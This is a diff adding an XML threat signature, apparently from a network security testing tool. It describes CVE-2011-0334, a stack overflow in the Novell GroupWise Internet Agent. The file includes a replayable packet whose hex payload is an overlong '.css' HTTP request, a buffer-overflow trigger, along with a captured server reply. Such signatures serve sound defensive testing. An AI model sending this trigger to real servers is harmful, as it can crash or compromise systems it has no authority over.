@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell GroupWise Internet Agent HTTP Interface Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A remote code execution vulnerability exists in Novell GroupWise Internet Agent (GWIA) HTTP interface (port&#13;&#10;9850/tcp). The vulnerability is due to a boundary error when parsing overly long HTTP requests to certain .css&#13;&#10;resources.&#13;&#10;An unauthenticated remote attacker could exploit this vulnerability to execute arbitrary code on targeted vulnerable&#13;&#10;installations of GWIA under the context of the SYSTEM user."/>
+    <Intent display="true">
+      <item value="Code_Execution"/>
+    </Intent>
+    <Protocol display="true" value="HTTP, over port 9850/TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="GroupWise"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="8.0x_up_to_(and_including)_8.02HP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20110927-02"/>
+    <CVEID display="true" value="CVE-2011-0334"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="c18947adb834f411ad9a57f2c01b0c4d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634553213657953039"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1319707831" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:55:C3:0D" destMac="00:0C:29:51:D6:89" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="017D" Identification="E085" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="EF7B" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="38886" destPort="$destPort" SeqNumber="01FC9630" AckNumber="D05C50E4" HeaderLength="08" WindowSize="005C" Checksum="A8D6" UrgentPointer="0000" Options="0101080A00AB76B100000000" Payload="474554202F67776167656E74732E6373733F4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414120485454502F312E310D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:51:D6:89" destMac="00:0C:29:55:C3:0D" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00A7" Identification="A78B" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="E94B" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="38886" SeqNumber="D05C50E4" AckNumber="01FC977A" HeaderLength="08" WindowSize="FEB6" Checksum="4C82" UrgentPointer="0000" Options="0101080A0001A0CC00AB76B1" Payload="485454502F312E3120323030200D0A446174653A204672692C2033302053657020323031312031373A30313A353720474D540D0A5365727665723A2057696E646F77732047726F757057697365204757494120382E302E310D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
